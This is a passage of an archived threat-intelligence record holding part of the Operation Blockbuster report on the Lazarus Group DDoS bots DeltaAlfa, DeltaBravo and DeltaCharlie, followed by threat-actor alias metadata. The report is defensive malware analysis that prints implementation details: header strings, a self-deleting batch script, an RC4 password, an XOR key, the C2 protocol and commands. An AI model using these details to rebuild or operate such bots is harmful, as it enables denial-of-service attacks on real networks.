6-2: DeltaAlfa’s HTTP Attack GET Request Structure**\n\n\n-----\n\nThe value supplied to the Accept: field is randomly selected from one of five hardcoded strings (Figure 6-3). Likewise,\nthe User-Agent: field can be one of seven hardcoded strings (Figure 6-4) selected at random. The “Cache-Control:\n```\n       no-store, must-revalidate” entry is randomly inserted or omitted for each attack iteration.\n         */*\n         text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\n```\n**image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */***\n```\n         image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg,\n         application/x-ms-xbap, */*\n\n```\n**image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/**\n```\n         vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\n\n```\n**Figure 6-3: Possible Accept: Field Values**\n```\n         Mozilla/5.0 (X11; U; Linux i686; ko-KR; rv:1.9.0.4) Gecko/2008111217 Fedora/3.0.4-1.fc10\n         Firefox/3.0.4\n         Mozilla/5.0 (Windows; U; Windows NT 5.1; ko; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8\n         Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\n         Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727;\n         .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)\n         Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\n         Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2)\n\n```\n**Figure 6-4: Possible User-Agent: Field Values**\n\n\n-----\n\n### 7. [DDoS Bot] DeltaBravo\n\nDeltaBravo is a DDoS bot that uses the Winpcap NPF driver in order to generate raw network packets from a victim’s\nmachine. Observed being dropped alongside RomeoIndia by IndiaFoxtrot, DeltaBravo is structurally a fairly simplistic\nDDoS bot that performs a somewhat convoluted handshake between itself and its controlling server in order to receive\ntargeting information.\n\nDeltaBravo, upon activation, operates in one of two modes: driver installation mode and DoS-bot mode. If called with only\na single command line argument, the malware activates in driver installation mode. This mode determines if the victim’s\noperating system is 32 or 64-bit and drops the architecture-appropriate WinPcap NPF driver from the DeltaBravo’s own PE\nresource section to the victim’s %SYSDIR%\\drivers directory as npf.sys.\n\nIf activated with 4 or more command line arguments, DeltaBravo first activates driver installation mode before entering\n_DoS-bot mode (failure to provide the 4 command line arguments results in DeltaBravo skipping DoS-bot mode). The second_\ncommand line argument supplied to DeltaBravo specifies the address of the C2 server while the third command line\nargument contains the C2 server’s listening port. DeltaBravo begins by determining the victim’s MAC address and hard\ndrive serial number which it uses to generate a MD5 hash that represents the victim’s unique identifier. This information\nis transmitted to the C2 server as part of the handshake along with a flag that indicates if the C2 server’s IP address exists\nwithin the IANA private IP space (10.0.0.0/8, 172.16.0.0/12, or 192.168.0.0/16).\n\nAfter establishing a connection to the C2 server, the C2 server ultimately transmits a DoS attack command. In order to\nfulfill the attack request, DeltaBravo activates the WinPcap driver (via wpcap_adapter_open) after generating an\nattack packet. The C2 server sends both the type of packet to generate and the number of times the packet is transmitted.\nAfter completing its attack, DeltaBravo will sleep for 100ms before requesting a new attack directive from the C2 server.\n\nIf for any reason DeltaBravo exits the communication/attack cycle, the binary generates a suicide script named msvcrt.bat\nusing a wsprintf statement with the following format string:\n```\n           wsprintfA(script, \":L1\\r\\ndel \\\"%s\\\"\\r\\nif exist \\\"%s\\\" goto L1\\r\\ndel \\\"%s\\\"\\r\\n\",\n\n           szBinaryName, szBinaryName, szScriptName);\n\n```\n**Figure 7-1: DeltaBravo's Suicide Script Generator**\n\nOnce generated, DeltaBravo activates the script via a call to CreateProcess before terminating.\n\n\n-----\n\n### 8. [DDoS Bot] DeltaCharlie\n\nMuch like DeltaBravo (see Section 7), DeltaCharlie is a DDoS bot that relies on the Winpcap NPF driver for the generation\nof raw network packets. Unlike DeltaBravo, however, DeltaCharlie is capable of the following basic instructions:\n\n          - Download and execute a binary from the C2 server\n\n          - Download a new configuration from the C2 server\n\n          - Update its own binary\n\n          - Terminate its own process\n\n          - Activate a DDoS attack\n\n         - Terminate a DDoS attack\n\nDeltaCharlie operates as a svchost-based service (netplug). After ServiceMain is activated by the operating system\nand the necessary service framework code has executed, DeltaCharlie determines its exclusivity on the victim’s system by\nlooking for the existence of a named mutex with the identifier Global\\NetplugDiscovery0.7.\n\nThe configuration for DeltaCharlie exists within the same directory as the DeltaCharlie binary under the name netplg.log.\nThe configuration file is encrypted with RC4 (with the password InitializeSecurityContextA). DeltaCharlie must\nsuccessfully load the configuration in order to operate; a failure to do so results in DeltaCharlie silently terminating.\n\nDeltaCharlie is multithreaded: in addition to the main thread, DeltaCharlie spins up a thread whose only function is the\ncataloguing of attack information into an unencrypted log file located as %SYSDIR%\\catroot2\\edbchk.log. The log\nfile identifies the number of packets and the rate at which the packets are sent for each attack issued by the C2 server.\n\nDeltaCharlie connects to the C2 server after iterating through the three C2 server addresses in the configuration.\nDeltaCharlie resolves the C2 server address and then applies an XOR 0x579C3A53 to the resolved address in order to\nreveal the true C2 server IP address. DeltaCharlie then uses a handshake that consists of generating a 16-byte random\nbuffer and then encrypting the buffer using the DNSCALC-style encoding seen in several other malware families\nattributed to the Lazarus Group. The buffer is sent to the C2 server, and the C2 server responds by sending back the\n16-byte buffer decrypted. If the original random 16-byte buffer matches the 16-bytes returned by the C2 server, then the\nhandshake is successful and communication between the C2 server and DeltaCharlie can commence.\n\nDeltaCharlie then requests the C2 server’s current time and calculates the difference, in seconds, between the C2 server’s\ntime and its own. If DeltaCharlie has any outstanding commands that it has yet to execute, it transmits the information\nto the C2 server along with the current attack log (edbchk.log). DeltaCharlie then transmits information about the\nvictim’s system (specifically the hard drive’s serial number, computer name, and network IP address) to the C2 server.\n\nDeltaCharlie, much like SierraJuliett-MikeOne, uses command files for the transmission of commands from the C2 to\nthe malware. The commands are given unique, incremental ID numbers. In order to keep track of commands that have\nalready been executed, thereby avoiding unnecessary network load on the C2 server, DeltaCharlie transmits the command\nID number of the last command it executed. The C2 server, in turn, sends the next command to the malware. The\ncommand files are both encrypted and signed. Each command file contains a MD5 hash encrypted using a private RSA\nkey. DeltaCharlie uses the following public key to decrypt the MD5 hash value:.\n\n\n-----\n\n|COMMAND IDENTIFIER|INTERNAL COMMAND NAME|DESCRIPTION|\n|---|---|---|\n|0|DownExec|Downloads and potentially executes a file|\n|1|ChngBotconfig|Alters the current configuration and saves the configuration to disk|\n|2|BotUpdate|Replaces the contents of the current DeltaCharlie binary with a new binary image|\n|3|BotDie|Terminates the current DeltaCharlie process|\n|4||Starts a new DoS attack by generating a new attack thread.|\n|5||Stops an active DoS attack.|\n\n```\n       7B4E1EA7E93F364CDEF4F099C4D9B794A1FFF297D391139DC01202E44CBB6C7748EE6F4B9B53609845A528\n\n       658A0BF83973D71A4413B36ABB6144AF3147E787C2AE7AA72C3AD95C2E421AA678FE2CADED393FFAD0AD3\n\n       DD9C53D28EF3D67B1E0683F58A01927CC27C9E8D81E7EEE91DD13B347EF571ACAFF9A60E06408AAE292D0\n\n```\nThe MD5 hash is located between bytes 4 and 132 of the command file while the MD5 hash relates to the data that follows the\n132nd byte. DeltaCharlie calculates the MD5 hash of the data that follows the encrypted MD5 header and compares it to the\ndecrypted MD5 hash value. If the two values are identical, DeltaCharlie determines that the command file is valid. The data\nthat follows the encrypted MD5 header is encrypted with RC4 (using the password InitializeSecurityContextA).\nThe entirety of the command file validation is remarkably similar to the method that SierraJuliett-MikeOne employs for\nverifying its command files.\n\nAfter decrypting the command file, DeltaCharlie sends the status of the decryption to the C2 server and then dispatches\nthe appropriate handler for the command type. DeltaCharlie supports six different commands identified in Table 8-1.\n\n**COMMAND** **INTERNAL**\n\n**DESCRIPTION**\n\n**IDENTIFIER** **COMMAND NAME**\n\n0 `DownExec` Downloads and potentially executes a file\n\n1 **ChngBotconfig** Alters the current configuration and saves the configuration to disk\n\n2 `BotUpdate` Replaces the contents of the current DeltaCharlie binary with a new binary image\n\n3 `BotDie` Terminates the current DeltaCharlie process\n\n4 Starts a new DoS attack by generating a new attack thread.\n\n5 Stops an active DoS attack.\n\n**Table 8-1: DeltaCharlie Commands**\n\nThe DoS attacks that DeltaCharlie can perform consist of NTP attacks, Carrier-Grade NAT (CGN) attacks, and DNS\nattacks. The kickoff of any attack is followed by a two second sleep interval.\n\n\n-----\n\n### 9. Conclusions\n\nThe destructive malware within the Lazarus Group’s collection ranges from simplistic to moderately advanced in\nconstruction and style. However, regardless of the structure and complexity of the code for any particular tool, their oper­\national effectiveness is undeniable. The author(s) behind these destructive malware families have developed a set of tools\ncapable of inflicting significant damage against a target either directly, as in the case of the Whiskey families, or remotely,\nvia the Delta families. This further emphasizes that even a moderately capable adversary with minimal resources is able to\nperform asymmetric cyberwar against a large target.\n\n\n-----\n\nMcLean, Virginia – Headquarters\n7921 Jones Branch Drive\n5th Floor\nMcLean, VA 22102\n\n**www.OperationBlockbuster.com**\n\nPhone: (571) 282-3000\nwww.novetta.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.02.24.Operation_Blockbuster/Operation-Blockbuster-Destructive-Malware-Report.pdf"
    ],
    "report_names": [
        "Operation-Blockbuster-Destructive-Malware-Report"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d18fe42c-8407-4f96-aee0-a04e6dce219a",
            "created_at": "2023-01-06T13:46:38.275292Z",
            "updated_at": "2025-03-27T02:00:02.79092Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "Calc Team",
                "IXESHE",
                "BRONZE GLOBE",
                "BeeBus",
                "DynCalc",
                "DNSCalc",
                "Crimson Iron",
                "NUMBERED PANDA",
                "TG-2754",
                "Group 22"
            ],
            "source_name": "MISPGALAXY:APT12",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6a660ea2-1118-404a-9f8f-f0d6a1e9f184",
            "created_at": "2022-10-25T15:50:23.685924Z",
            "updated_at": "2025-03-27T02:00:55.52357Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "APT12",
                "IXESHE",
                "DynCalc",
                "Numbered Panda",
                "DNSCALC"
            ],
            "source_name": "MITRE:APT12",
            "tools": [
                "Ixeshe",
                "RIPTIDE",
                "HTRAN"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c5f79f58-db78-4cd7-88cf-c029a2199360",
            "created_at": "2022-10-25T16:07:23.325227Z",
            "updated_at": "2025-03-27T02:02:09.738383Z",
            "deleted_at": null,
            "main_name": "APT 12",
            "aliases": [
                "APT 12",
                "BeeBus",
                "Bronze Globe",
                "CTG-8223",
                "Calc Team",
                "Crimson Iron",
                "DNSCalc",
                "DynCALC",
                "Group 22",
                "Numbered Panda"
            ],
            "source_name": "ETDA:APT 12",
            "tools": [
                "AUMLIB",
                "ETUMBOT",
                "Exploz",
                "Graftor",
                "HIGHTIDE",
                "IHEATE",
                "IXESHE",
                "RIPTIDE",
                "RapidStealer",
                "Specfix",
                "THREEBYTE",
                "bbsinfo",
                "mswab",
                "yayih"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e6e26922-3f4f-4243-9af5-cf9bea8b93bd",
            "created_at": "2022-10-25T16:47:55.577163Z",
            "updated_at": "2025-03-27T02:05:17.26824Z",
            "deleted_at": null,
            "main_name": "BRONZE GLOBE",
            "aliases": [
                "CTG-8223 ",
                "DNSCalc",
                "DyncCalc",
                "Numbered Panda ",
                "APT12 "
            ],
            "source_name": "Secureworks:BRONZE GLOBE",
            "tools": [
                " BeepService",
                " Etumbot",
                " Gh0st RAT",
                " Ixeshe",
                " Mswab",
                " RAdmin",
                " Seatran",
                " SvcInstaller",
                " Ziyang",
                "Badpuck"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 0,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/5a5139532e0fdcc76ed9b216d03e33fc27949bc5.pdf",
        "text": "https://archive.orkl.eu/5a5139532e0fdcc76ed9b216d03e33fc27949bc5.txt",
        "img": "https://archive.orkl.eu/5a5139532e0fdcc76ed9b216d03e33fc27949bc5.jpg"
    }
}